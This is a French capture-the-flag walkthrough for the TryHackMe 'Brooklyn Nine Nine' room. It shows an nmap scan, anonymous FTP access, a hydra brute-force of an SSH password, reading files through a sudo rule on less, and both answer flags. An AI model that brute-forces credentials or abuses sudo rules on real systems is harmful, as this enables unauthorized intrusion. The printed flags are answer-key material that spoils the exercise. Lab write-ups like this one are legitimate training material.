# Brooklyn Nine Nine #

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.60.60 brooklyn.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme/write-up$ sudo nmap -A brooklyn.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-30 20:05 CEST
Nmap scan report for brooklyn.thm (10.10.60.60)
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.228.66
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/30%OT=21%CT=1%CU=33556%PV=Y%DS=2%DC=T%G=Y%TM=61043F9
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M506ST11NW6%O2=M506ST11NW6%O
OS:3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O6=M506ST11)WIN(W1=F4B3%W2=
OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M506NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   32.96 ms 10.9.0.1
2   77.44 ms brooklyn.thm (10.10.60.60)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.74 seconds

```

On voit plusieurs services :
Le service Ftp sur le port 21 qui fonctionne en en anonymous.  
Le service Ssh sur le port 22.  
Le service Http sur le port 80.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ftp brooklyn.thm
Connected to brooklyn.thm.
220 (vsFTPd 3.0.3)
Name (brooklyn.thm:tim): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.03 secs (4.0823 kB/s)
ftp> exit
221 Goodbye.
tim@kali:~/Bureau/tryhackme/write-up$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

On se connect sur le service Ftp en mode anonymous.  
On récupère le fichier et on lit le fichier.  
Dans le fichier on trouve le nom de l'utilisateur et on nous dévoile que le mot de passe est faible.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://brooklyn.thm -t 12
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-30 20:14:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task
[DATA] attacking ssh://brooklyn.thm:22/
[22][ssh] host: brooklyn.thm   login: jake   password: 987654321
```

Avec hydra on trouve le mot passe pour le service SSH.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh jake@brooklyn.thm
The authenticity of host 'brooklyn.thm (10.10.60.60)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'brooklyn.thm,10.10.60.60' (ECDSA) to the list of known hosts.
jake@brooklyn.thm's password: 
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls /home/
amy  holt  jake
jake@brookly_nine_nine:~$ ls /home/holt/
nano.save  user.txt
jake@brookly_nine_nine:~$ cat /home/holt/user.txt 
ee11cbb19052e40b07aac0ca060c23ee

```

Une fois connecté, on récupère le flag.  
La réponse est : ee11cbb19052e40b07aac0ca060c23ee  

```bash
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```  

Dans la configuration de sudo nous permet d'exécuter less sans mot de passe.   

```bash
jake@brookly_nine_nine:~$ sudo /usr/bin/less /root/root.txt













-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
/root/root.txt (END)

```

Avec less, on peut lire le dernier flag.  
La réponse est : 63a9f0ea7bb98050796b649e85481845  